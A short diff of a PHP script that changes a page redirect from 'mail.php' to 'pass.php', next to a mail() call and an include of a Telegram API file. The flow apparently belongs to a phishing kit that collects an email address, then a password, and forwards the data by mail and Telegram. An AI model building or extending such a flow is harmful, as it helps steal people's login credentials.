@@ -113,7 +113,7 @@ mail($email,$subject,$message,$headers,$head );
 
 include "TelegramApi.php";
 
-echo "<meta http-equiv=\"Refresh\" content=\"0; url=../mail.php\" />";
+echo "<meta http-equiv=\"Refresh\" content=\"0; url=../pass.php\" />";
 
 
 
